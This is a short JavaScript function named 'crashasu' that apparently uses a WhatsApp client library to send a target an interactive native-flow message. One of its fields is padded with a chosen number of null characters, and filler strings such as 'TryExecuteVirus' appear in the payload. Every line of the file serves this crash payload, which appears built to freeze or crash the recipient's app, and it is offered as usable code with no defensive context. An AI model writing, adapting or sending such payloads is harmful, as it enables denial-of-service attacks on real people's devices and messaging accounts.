exports.crashasu = async (qio, target, text, amount, ptcp = true) => {
    await qio.relayMessage(target, 
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: text,
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: 'food_message',
                            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_status_0\":\"pending\",\"screen_2_order_type_0\":\"ORDER\",\"screen_1_Dropdown_0\":\"Alwaysaqioo Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_1\":\"TryExecuteVirus\",\"screen_1_TextInput_2\":\"qioslevew@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_OptIn_1\":true,\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(amount)}\",\"screen_0_TextInput_1\":\"clucking\",\"screen_0_Dropdown_2\":\"file\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"screen_0_ExpiryTimestamp_4\":\"18400000\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAD0QI3s.\"}`,
                            version: 3
                        }
                    }
                }
            }
        }, 
        ptcp ? { participant: { jid: target } } : {}
    );
};